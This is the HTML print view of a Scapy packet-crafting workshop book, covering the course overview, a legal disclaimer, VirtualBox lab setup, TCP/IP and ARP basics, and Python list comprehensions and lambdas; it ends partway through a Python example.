<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>The Art of Packet Crafting with Scapy</title>
                <meta name="robots" content="noindex" />
                

        <!-- Custom HTML head -->
        

        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

                <link rel="icon" href="favicon.svg">
                        <link rel="shortcut icon" href="favicon.png">
                <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
                <link rel="stylesheet" href="css/print.css" media="print">
        
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
                <link rel="stylesheet" href="fonts/fonts.css">
        
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        
            </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded affix "><li class="part-title">The Art of Packet Crafting with Scapy</li><li class="chapter-item expanded "><a href="intro/index.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="intro/workshop-overview.html"><strong aria-hidden="true">1.1.</strong> Workshop Overview</a></li><li class="chapter-item expanded "><a href="intro/license.html"><strong aria-hidden="true">1.2.</strong> License</a></li><li class="chapter-item expanded "><a href="intro/bigger_picture.html"><strong aria-hidden="true">1.3.</strong> Bigger Picture</a></li><li class="chapter-item expanded "><a href="intro/trainers.html"><strong aria-hidden="true">1.4.</strong> Trainers</a></li><li class="chapter-item expanded "><a href="intro/disclaimer.html"><strong aria-hidden="true">1.5.</strong> Disclaimer</a></li><li class="chapter-item expanded "><a href="intro/feedback.html"><strong aria-hidden="true">1.6.</strong> Feedback</a></li></ol></li><li class="chapter-item expanded "><a href="setup/index.html"><strong aria-hidden="true">2.</strong> Lab Setup</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="setup/mysterious_boxes.html"><strong aria-hidden="true">2.1.</strong> Mysterious Boxes</a></li><li class="chapter-item expanded "><a href="setup/network-hunt.html"><strong aria-hidden="true">2.2.</strong> Network Hunt</a></li></ol></li><li class="chapter-item expanded "><a href="networking/index.html"><strong aria-hidden="true">3.</strong> Networking Basics</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="networking/layers.html"><strong aria-hidden="true">3.1.</strong> Network Layers</a></li><li class="chapter-item expanded "><a href="networking/socket-interface.html"><strong aria-hidden="true">3.2.</strong> Socket Interface</a></li><li class="chapter-item expanded "><a href="networking/packet-headers.html"><strong aria-hidden="true">3.3.</strong> Packet Headers</a></li><li class="chapter-item expanded "><a href="networking/arp.html"><strong aria-hidden="true">3.4.</strong> ARP Protocol</a></li></ol></li><li class="chapter-item expanded "><a href="python/index.html"><strong aria-hidden="true">4.</strong> Python</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="python/python_concepts.html"><strong aria-hidden="true">4.1.</strong> Python Concepts</a></li></ol></li><li class="chapter-item expanded "><a href="scapy/index.html"><strong aria-hidden="true">5.</strong> Scapy</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="scapy/scapy_intro.html"><strong aria-hidden="true">5.1.</strong> Scapy Intro</a></li><li class="chapter-item expanded "><a href="scapy/scapy_modes.html"><strong aria-hidden="true">5.2.</strong> Scapy Modes</a></li><li class="chapter-item expanded "><a href="scapy/exploring_scapy.html"><strong aria-hidden="true">5.3.</strong> Exploring Scapy</a></li><li class="chapter-item expanded "><a href="scapy/creating_packets.html"><strong aria-hidden="true">5.4.</strong> Creating Packets</a></li><li class="chapter-item expanded "><a href="scapy/inspecting_packets.html"><strong aria-hidden="true">5.5.</strong> Inspecting Packets</a></li><li class="chapter-item expanded "><a href="scapy/send_revieve_packets.html"><strong aria-hidden="true">5.6.</strong> Send &amp; Recieve Packets</a></li><li class="chapter-item expanded "><a href="scapy/import_export_data.html"><strong aria-hidden="true">5.7.</strong> Import &amp; Export Data</a></li><li class="chapter-item expanded "><a href="scapy/sniffing.html"><strong aria-hidden="true">5.8.</strong> Sniffing</a></li></ol></li><li class="chapter-item expanded "><a href="recon/index.html"><strong aria-hidden="true">6.</strong> Network Recon</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="recon/host_discovery.html"><strong aria-hidden="true">6.1.</strong> Host Discovery</a></li><li class="chapter-item expanded "><a href="recon/service_discovery.html"><strong aria-hidden="true">6.2.</strong> Service Discovery</a></li><li class="chapter-item expanded "><a href="recon/os_detection.html"><strong aria-hidden="true">6.3.</strong> OS Detection</a></li><li class="chapter-item expanded "><a href="recon/promisc.html"><strong aria-hidden="true">6.4.</strong> Detect Promisc Mode</a></li><li class="chapter-item expanded "><a href="recon/pcap_analysis.html"><strong aria-hidden="true">6.5.</strong> PCAP Analysis</a></li><li class="chapter-item expanded "><a href="recon/traceroute.html"><strong aria-hidden="true">6.6.</strong> Traceroute</a></li></ol></li><li class="chapter-item expanded "><a href="attacks/index.html"><strong aria-hidden="true">7.</strong> Network Attacks</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="attacks/cam_overflow.html"><strong aria-hidden="true">7.1.</strong> CAM Overflow Attack</a></li><li class="chapter-item expanded "><a href="attacks/arp_spoofing.html"><strong aria-hidden="true">7.2.</strong> ARP Spoofing</a></li></ol></li><li class="chapter-item expanded "><a href="libraries/index.html"><strong aria-hidden="true">8.</strong> Libraries</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="libraries/netaddr.html"><strong aria-hidden="true">8.1.</strong> netaddr</a></li><li class="chapter-item expanded "><a href="libraries/netifaces.html"><strong aria-hidden="true">8.2.</strong> netifaces</a></li></ol></li><li class="chapter-item expanded "><a href="exercises/index.html"><strong aria-hidden="true">9.</strong> Exercises</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="exercises/misc.html"><strong aria-hidden="true">9.1.</strong> Misc Exercises</a></li><li class="chapter-item expanded "><a href="exercises/network_hunt.html"><strong aria-hidden="true">9.2.</strong> Network Hunt</a></li></ol></li><li class="chapter-item expanded "><a href="misc/references.html"><strong aria-hidden="true">10.</strong> References</a></li></ol>            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                                                <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                                            </div>

                    <h1 class="menu-title">The Art of Packet Crafting with Scapy</h1>

                    <div class="right-buttons">
                                                <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                                                                        
                    </div>
                </div>

                                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <div style="break-before: page; page-break-before: always;"></div><h1 id="introduction"><a class="header" href="#introduction">Introduction</a></h1>
<ul>
<li><a href="intro/workshop-overview.html">Workshop Overview</a></li>
<li><a href="intro/license.html">License</a></li>
<li><a href="intro/bigger_picture.html">Bigger Picture</a></li>
<li><a href="intro/trainers.html">Trainers</a></li>
<li><a href="intro/disclaimer.html">Disclaimer</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="workshop-overview"><a class="header" href="#workshop-overview">Workshop overview</a></h1>
<ul>
<li>This is an intense workshop on crafting packets using Python and Scapy</li>
<li>We’ll understand low level networking details/abstractions like raw sockets and move towards using high level tools like Scapy to craft packets</li>
<li>We’ll understand Scapy framework and craft packets using it</li>
<li>We’ll leverage Scapy as a framework to build custom network tools/utilities</li>
</ul>
<h2 id="concepts-covered"><a class="header" href="#concepts-covered">Concepts covered</a></h2>
<ul>
<li>Practical network reconnaissance techniques like host discovery, service discovery, Remote OS finger printing, promiscuous node detection using Scapy</li>
<li>Launching Layer 2 attacks</li>
<li>Leverage Scapy to build custom tools/utilities such as sniffers, pcap analyzer, wireless sniffers and scanners</li>
</ul>
<h2 id="skill-prerequisites"><a class="header" href="#skill-prerequisites">Skill prerequisites</a></h2>
<ul>
<li>Basics of Python programming. (strings, lists, functions, list comprehensions etc)</li>
<li>Knowledge of basic networking concepts. (Enough to know what an IP address, port number, OSI model etc.)</li>
<li>Comfortable with basic operations on your host Operating System. (copying files, using text editor)</li>
</ul>
<h2 id="technical-prerequisites"><a class="header" href="#technical-prerequisites">Technical prerequisites</a></h2>
<ul>
<li>Laptop with administrator access (mandatory)</li>
<li>Minimum 4 GB RAM and 5 GB free hard disk space (More the better)</li>
<li>Preferably running Linux as primary OS but Windows/Mac is permissible</li>
<li>Preferably, your own Internet connectivity</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="license"><a class="header" href="#license">License</a></h1>
<p><img src="intro/../imgs/license_logo.png" alt="license-logo" /></p>
<p>Copyright 2020 Bharath Kumar.</p>
<p>Except as otherwise noted, the content of this workshop is licensed under the Creative Commons Attribution-Share Alike 4.0 International License and the code samples are licensed under the Apache 2.0 License.</p>
<p>“Network Hunt” CTF is based on work created and shared by James Sullivan and used according to terms described in the MIT license.</p>
<p>All the packet header illustrations are reproduced work created and shared by Matt Baxter as seen at <a href="https://nmap.org/book/tcpip-ref.html">Nmap reference book</a> </p>
<p><img src="intro/../imgs/license_poster.png" alt="license-poster" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="bigger-picture"><a class="header" href="#bigger-picture">Bigger Picture</a></h1>
<p>This workshop is part of a series of workshops as shown below.</p>
<p><img src="intro/../imgs/bigger_picture.png" alt="bigger-picture" /></p>
<p>The training material could be found at <a href="https://disruptivelabs.in/training">https://disruptivelabs.in/training</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="trainers"><a class="header" href="#trainers">Trainers</a></h1>
<h2 id="bharath-kumar"><a class="header" href="#bharath-kumar">Bharath Kumar</a></h2>
<p>Personal website: <a href="https://disruptivelabs.in/">https://disruptivelabs.in/</a></p>
<p>Twitter: <a href="https://twitter.com/0xbharath">https://twitter.com/0xbharath</a></p>
<p>Github: <a href="https://github.com/0xbharath">https://github.com/0xbharath</a></p>
<h2 id="abhinav-chourasia"><a class="header" href="#abhinav-chourasia">Abhinav Chourasia</a></h2>
<p>Twitter: <a href="https://twitter.com/geek_ji">https://twitter.com/geek_ji</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="disclaimer"><a class="header" href="#disclaimer">Disclaimer</a></h1>
<h2 id="legal-ramifications"><a class="header" href="#legal-ramifications">Legal ramifications!</a></h2>
<p>The legal ramifications of scanning networks are complex and controversial (like with many other laws pertaining to computer security). When using tools like Scapy/Nmap the line between doing something benign and malignant is thin. Always have written permission before scanning a network that you don’t own, know what you are doing, know your jurisdictions and speak to a lawyer.</p>
<p>The general rule for this class is:</p>
<hr />
<p align="center"><b>"You don’t own it; You don’t scan it!"</b></p>
<hr />
<p>More about this topic - <a href="https://nmap.org/book/legal-issues.html">https://nmap.org/book/legal-issues.html</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="reader-feedback"><a class="header" href="#reader-feedback">Reader feedback</a></h1>
<p>Feedback from readers is expected and appreciated. We are actively looking forward to improving the training content. Let us know what you think about this training — what you liked or may have disliked. Reader feedback is important for us to develop more content.</p>
<p>If you find mistakes, omissions, errors or blatant lies in the training content, please let me know and I will make changes. I will give proper credits to everyone who helps out! I hope to make this training content better over time.</p>
<p>You can provide the feedback by raising a issue in the <a href="https://github.com/0xbharath/art-of-packet-crafting-with-scapy">github repo</a> or directly to the author via <a href="https://twitter.com/0xbharath">social media</a>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="lab-setup"><a class="header" href="#lab-setup">Lab setup</a></h1>
<p align="center">"<i>Give me six hours to chop down a tree and I will spend the first four sharpening the axe.</i>" - Lincoln</p>
<ul>
<li><a href="setup/mysterious_boxes.html">Mysterious Boxes</a></li>
<li><a href="setup/network-hunt.html">Network Hunt</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="mysterious-boxes"><a class="header" href="#mysterious-boxes">Mysterious Boxes</a></h1>
<p>Follow the guidlines listed below as-is if you are using *nix OS. If you are using Windows then replace all the <code>.sh</code> files in the following steps with <code>.bat</code> files and follow the steps.</p>
<h2 id="setup"><a class="header" href="#setup">Setup</a></h2>
<h3 id="step-1"><a class="header" href="#step-1">Step 1</a></h3>
<ul>
<li>Install VirtualBox (preferably 5.0 or later)</li>
</ul>
<h3 id="step-2"><a class="header" href="#step-2">Step 2</a></h3>
<ul>
<li>Download the lab setup files and virtual machines available as zip file at following link</li>
</ul>
<p><a href="https://archive.org/download/scapy-pc-workshop-32bit/scapy-pc-workshop-32bit.zip">https://archive.org/download/scapy-pc-workshop-32bit/scapy-pc-workshop-32bit.zip</a></p>
<ul>
<li>Extract the zip file in a directory </li>
</ul>
<pre><code>unzip scapy-pc-workshop-32bit.zip
</code></pre>
<h3 id="step-3"><a class="header" href="#step-3">Step 3</a></h3>
<ul>
<li>
<p>Change the directory to the directory where you have extracted the files</p>
</li>
<li>
<p>Run the script <code>import_labs.sh</code></p>
<ul>
<li>This script will import all the OVA files from the directory into your VirtualBox</li>
<li>In the end, this script will list all the VMs available in VirtualBox</li>
<li>If you see victim1, victim2, attacker in the VMs list, the importing is successful</li>
</ul>
</li>
<li>
<p>Run the script <code>start_labs.sh</code></p>
<ul>
<li>This script will setup and run your lab VMs</li>
<li>All the victims will run in the background and only attacker will run in the foreground</li>
<li>This script will display list of all the running VMs in the end</li>
<li>If you see two victims and an attacker in the list, you are ready!</li>
</ul>
</li>
</ul>
<p><em>Run the script <code>stop_labs.sh</code> when done with the labs. This will gracefully shutdown all the lab VMs.</em></p>
<h2 id="troubleshooting-windows"><a class="header" href="#troubleshooting-windows">Troubleshooting (Windows)</a></h2>
<p>All the scripts assume the VirtualBox installation is at <code>C:\Program Files\Oracle\VirtualBox</code>. In case, if the installation is at a different location, edit the following line in script to manually point to the right location.</p>
<pre><code>PATH=%PATH%;C:\Program Files\Oracle\VirtualBox
</code></pre>
<p>All the VMs have host-only interface turned on by default. Windows VirtualBox interface naming convention tend to be inconsistent. In case you are having trouble starting VMs due to network interface name, change the interface name in script manually to match your VirtualBox host-only adapter interface name.</p>
<pre><code>vboxmanage modifyvm &quot;victim1&quot; --nic1 hostonly --hostonlyadapter1 &lt;YOUR_INTERFACE_NAME_HERE&quot;&gt;
</code></pre>
<h2 id="topology"><a class="header" href="#topology">Topology</a></h2>
<h3 id="host-machine"><a class="header" href="#host-machine">Host machine</a></h3>
<ul>
<li>Host OS is the primary Operating System on which you are running VirtualBox</li>
<li>Host OS is on the same sub-net as the VM’s</li>
</ul>
<h3 id="attacker-machine"><a class="header" href="#attacker-machine">Attacker machine</a></h3>
<pre><code>Username: attacker
Password: attacker
</code></pre>
<ul>
<li>The VM displayed after running <code>start_labs.sh</code> is our attacker</li>
<li>This is our base machine for this workshop from where we orchestrate our attacks</li>
<li>The attacker machine has SSH server running so you can use SSH to login to the machine</li>
<li>For GUI, you can login using the above credentials in the VM and run <code>startx</code> command</li>
<li>The GUI is openbox based, it is intended to be super minimal so don’t be surprised about lack of &quot;features&quot;</li>
<li><code>readme.txt</code> file in home directory has more info on tools installed and essential commands etc</li>
</ul>
<h3 id="victim-machines"><a class="header" href="#victim-machines">Victim machines</a></h3>
<ul>
<li>Bunch of pre-configured VM's</li>
<li>Configured to run in the background (headless mode)</li>
<li>Victims have varying operating systems, listening services and security policies</li>
</ul>
<h2 id="the-goal"><a class="header" href="#the-goal">The Goal</a></h2>
<p>To find as much information as we can about the victim machines using Scapy on attacker machine.</p>
<ul>
<li>Fingerprinting OSs</li>
<li>Find listening services</li>
<li>Understand security policies</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="network-hunt"><a class="header" href="#network-hunt">Network Hunt</a></h1>
<h2 id="setup-1"><a class="header" href="#setup-1">Setup</a></h2>
<p>Directory tree for the lab on your <em>attacker machine</em></p>
<pre><code>/
│
└───home
    │
    └───network_hunt_challenge
        │    
        └── network_hunt.py
</code></pre>
<ul>
<li>Run the <code>network_hunt.py</code> script as root</li>
</ul>
<pre><code>sudo python network_hunt.py 
</code></pre>
<ul>
<li>If the script executed without errors, the challenge is setup!</li>
<li>The lab will start and <code>tap0</code> interface will be created.</li>
<li>Terminating the script will deallocate this interface and release all state.</li>
</ul>
<p>Refer to &quot;exercises&quot; section –&gt; &quot;network hunt&quot; page in this notes for instruction on cracking the challenge.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="networking-basics"><a class="header" href="#networking-basics">Networking Basics</a></h1>
<ul>
<li><a href="networking/layers.html">Network Layers</a></li>
<li><a href="networking/socket-interface.html">Socket Interface</a></li>
<li><a href="networking/packet-headers.html">Packet Headers</a></li>
<li><a href="networking/arp.html">ARP Protocol</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="network-layers"><a class="header" href="#network-layers">Network Layers</a></h1>
<p><img src="networking/../imgs/osi_model.png" alt="network-layers" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="socket-interface"><a class="header" href="#socket-interface">Socket Interface</a></h1>
<p><img src="networking/../imgs/socket_interface.png" alt="socket-interface" /></p>
<h2 id="raw-sockets"><a class="header" href="#raw-sockets">Raw sockets</a></h2>
<p>Kernel offers two ways to forge packets:</p>
<h3 id="layer-3---pf_inet-sock_raw"><a class="header" href="#layer-3---pf_inet-sock_raw">Layer 3 - PF_INET, SOCK_RAW</a></h3>
<ul>
<li>Classic raw sockets</li>
<li>Lot of heavy lifting is done by the kernel which means there is a limitation on what you can do</li>
</ul>
<h3 id="layer-2---pf_packet-pf_raw"><a class="header" href="#layer-2---pf_packet-pf_raw">Layer 2 - PF_PACKET, PF_RAW</a></h3>
<ul>
<li>No hand holding by kernel</li>
<li>There is no limit on what you craft and send</li>
<li>You are responsible for choosing interfaces, linktypes, ARP stuff, calculate checksum etc</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="packet-headers"><a class="header" href="#packet-headers">Packet Headers</a></h1>
<p>This workshop is about crafting packets so it makes sense to spend some time in understanding what packets are and how they are structured.</p>
<p>Illustrations on this page are reproduced work created and shared by Matt Baxter as seen at <a href="https://nmap.org/book/tcpip-ref.html">https://nmap.org/book/tcpip-ref.html</a></p>
<h2 id="ip-header"><a class="header" href="#ip-header">IP header</a></h2>
<p><img src="networking/../imgs/ip_header.png" alt="ip-header" /></p>
<h2 id="tcp-header"><a class="header" href="#tcp-header">TCP header</a></h2>
<p><img src="networking/../imgs/tcp_header.png" alt="tcp-header" /></p>
<table><thead><tr><th>TCP flag</th><th>Binary</th><th>Decimal</th><th>TCP Dump syntax</th></tr></thead><tbody>
<tr><td>URG</td><td>00100000</td><td>32</td><td>'tcp[13] == 32'</td></tr>
<tr><td>ACK</td><td>00010000</td><td>16</td><td>'tcp[13] == 16'</td></tr>
<tr><td>PSH</td><td>00001000</td><td>8</td><td>'tcp[13] == 8'</td></tr>
<tr><td>RST</td><td>00000100</td><td>4</td><td>'tcp[13] == 4'</td></tr>
<tr><td>SYN</td><td>00000010</td><td>2</td><td>'tcp[13] == 2'</td></tr>
<tr><td>FIN</td><td>00000001</td><td>1</td><td>'tcp[13] == 1'</td></tr>
</tbody></table>
<p>SYN-ACK = 00010010 = 18
RST-ACK = 00010100 = 20</p>
<p>TCP flags mnemonic - <strong>U</strong>nskilled <strong>A</strong>ttackers <strong>P</strong>ester <strong>R</strong>eal <strong>S</strong>ecurity <strong>F</strong>olks</p>
<h2 id="udp-header"><a class="header" href="#udp-header">UDP header</a></h2>
<p><img src="networking/../imgs/udp_header.png" alt="udp-header" /></p>
<h2 id="icmp-header"><a class="header" href="#icmp-header">ICMP header</a></h2>
<p><img src="networking/../imgs/icmp_header.png" alt="icmp-header" /></p>
<h2 id="arp-header"><a class="header" href="#arp-header">ARP header</a></h2>
<p><img src="networking/../imgs/arp.jpg" alt="arp-header" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="address-resolution-protocolarp-protcol"><a class="header" href="#address-resolution-protocolarp-protcol">Address Resolution Protocol(ARP) protcol</a></h1>
<p>Understanding ARP protocol is important to solve some challenges that's why we have an entire section for this protocol. We'll use this section as reference when we are solving relavant challenges.</p>
<ul>
<li>ARP is used for mapping a network address (e.g. an IPv4 address) to a physical address like an Ethernet address (also named a MAC address).</li>
<li>ARP has been implemented with many combinations of network and data link layer technologies but the most common being IPv4 over Ethernet.</li>
<li>The purpose of ARP is to find out the MAC address of a device in your Local Area Network (LAN), for the corresponding IPv4 address, which network application is trying to communicate.</li>
</ul>
<h2 id="arp-resolution"><a class="header" href="#arp-resolution">ARP resolution</a></h2>
<p><img src="networking/../imgs/arp-request.png" alt="arp-request" /></p>
<p><img src="networking/../imgs/arp-reply.png" alt="arp-reply" /></p>
<h3 id="step-1-1"><a class="header" href="#step-1-1">Step 1:</a></h3>
<p>When a source device want to communicate with another device, source device checks its ARP cache to find it already has a resolved MAC Address of the destination device. If it is there, it will use that MAC Address for communication. To view your Local ARP cache. (arp -a displays local arp cache)</p>
<h3 id="step-2-1"><a class="header" href="#step-2-1">Step 2:</a></h3>
<p>If ARP resolution is not there in local cache, the source machine will generate an ARP request message(who-has), it puts its own data link layer address as the Sender Hardware Address and its own IPv4 Address as the Sender Protocol Address. It fills the destination IPv4 Address as the Target Protocol Address. The Target Hardware Address will be left blank, since the machine is trying to find that.</p>
<h3 id="step-3-1"><a class="header" href="#step-3-1">Step 3:</a></h3>
<p>The source broadcast the Address Resolution Protocol (ARP) request message to the local network.</p>
<h3 id="step-4"><a class="header" href="#step-4">Step 4:</a></h3>
<pre><code>The message is received by each device on the LAN since it is a broadcast. Each device compare the Target Protocol Address (IPv4 Address of the machine to which the source is trying to communicate) with its own Protocol Address (IPv4 Address). Those who do not match will drop the packet without any action.
</code></pre>
<h3 id="step-5"><a class="header" href="#step-5">Step 5:</a></h3>
<p>When the targeted device checks the Target Protocol Address, it will find a match and will generate an Address Resolution Protocol (ARP) reply message. It takes the Sender Hardware Address and the Sender Protocol Address fields from the Address Resolution Protocol (ARP) request message and uses these values for the Targeted Hardware Address and Targeted Protocol Address of the reply message.</p>
<h3 id="step-6"><a class="header" href="#step-6">Step 6:</a></h3>
<p>The destination device will update its Address Resolution Protocol (ARP) cache, since it need to contact the sender machine soon.</p>
<h3 id="step-7"><a class="header" href="#step-7">Step 7:</a></h3>
<p>Destination device send the Address Resolution Protocol (ARP) reply message and it will NOT be a broadcast, but a unicast.</p>
<h3 id="step-8"><a class="header" href="#step-8">Step 8:</a></h3>
<p>The source machine will process the Address Resolution Protocol (ARP) reply from destination, it store the Sender Hardware Address as the layer 2 address of the destination.</p>
<h3 id="step-9"><a class="header" href="#step-9">Step 9:</a></h3>
<p>The source machine will update its Address Resolution Protocol (ARP) cache with the Sender Hardware Address and Sender Protocol Address it received from the Address Resolution Protocol (ARP) reply message.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="python-concepts"><a class="header" href="#python-concepts">Python concepts</a></h1>
<ul>
<li><a href="python/python_concepts.html">Python Concepts</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="python-concepts-1"><a class="header" href="#python-concepts-1">Python Concepts</a></h1>
<p>This training assumes that you already know basics of Python. This section by no means is an introduction to Python.</p>
<p>In this section we are covering Python concepts that are essential when using Scapy. If you need a quick intro to Python then you can use the content at <a href="https://cs.stanford.edu/people/nick/python-in-one-easy-lesson/">https://cs.stanford.edu/people/nick/python-in-one-easy-lesson/</a></p>
<h2 id="list-comprehensions"><a class="header" href="#list-comprehensions">List comprehensions</a></h2>
<ul>
<li>A list comprehension is a compact way to write an expression that expands to a whole list</li>
<li>List comprehension can almost substitute for the lambda function especially as <code>map()</code>, <code>filter()</code> and <code>reduce()</code></li>
</ul>
<p><img src="python/../imgs/list_comprehensions.png" alt="list-comprehensions" /></p>
<pre><code># compute a list of their squares of elements in a list
nums = [1, 2, 3, 4]

squares = [ n * n for n in nums ]   ## [1, 4, 9, 16]
</code></pre>
<pre><code>&gt;&gt;&gt; port_numbers = [22,25,80,139,443]
&gt;&gt;&gt; [k for k in port_numbers]
[22, 25, 80, 139, 443]
&gt;&gt;&gt;
&gt;&gt;&gt; numbers = [2,4,6,8] 
&gt;&gt;&gt; [k*2 for k in numbers]
[4, 8, 12, 16]
</code></pre>
<p>You can add an if test to the right of the for-loop to narrow the result. The if test is evaluated for each element, including only the elements where the test is true.</p>
<pre><code>&gt;&gt;&gt; port_numbers = [22,25,80,139,443,8080,9999,55555]
&gt;&gt;&gt; 
&gt;&gt;&gt; [k for k in port_numbers if k&lt;1023]
[22, 25, 80, 139, 443]
</code></pre>
<h2 id="lambda-functions"><a class="header" href="#lambda-functions">Lambda functions</a></h2>
<p>Syntax: <code>lambda arg1, arg2, …argN : expression using arguments</code>.</p>
<p><img src="python/../imgs/lambda.png" alt="lambda-function" /></p>
<ul>
<li>Python supports the creation of anonymous functions (i.e. functions that are not bound to a name) at runtime, using a construct called “lambda”.</li>
<li>Lambda functions take any number of arguments but only has one expression, the result of this expression is returned.</li>
</ul>
<blockquote>
<blockquote>
<blockquote>
<p>def f (x): return x**2
... 
print f(8)
64</p>
<p>g = lambda x: x**2</p>
<p>print g(8)
64</p>
</blockquote>
</blockquote>
</blockquote>
<ul>
<li>
<p>Lambda functions can be used anywhere a function is expected, not necessary to assign it to a variable</p>
</li>
<li>
<p>You can pass lambda functions to other functions to do stuff(for example lambda function as key to <code>sorted()</code>)</p>
</li>
<li>
<p>Extracting numbers that are multiples of 3</p>
</li>
<li>
<p>One element of data structure(a list here) gets passed to the lambda function at a time</p>
</li>
<li>
<p>Lambda function can only have one expression</p>
</li>
<li>
<p><code>filter</code> is a built-in function in Python that take a function and a data structure as arguments, passes one element of data structure at a time to the function</p>
</li>
</ul>
<pre><code>&gt;&gt;&gt; mult3 = filter(lambda x: x % 3 == 0, [1, 2, 3, 4, 5, 6, 7, 8, 9])
&gt;&gt;&gt; mult3
[3, 6, 9]
</code></pre>
<p>Sort elements in list by last character.</p>
<pre><code>&gt;&gt;&gt; lis = ['az', 'bbbbbbt', 'cccx']
&gt;&gt;&gt;
&gt;&gt;&gt; sorted_by_last = sorted(lis, key = lambda(x): x[-1] )   
&gt;&gt;&gt;
&gt;&gt;&gt; sorted_by_last
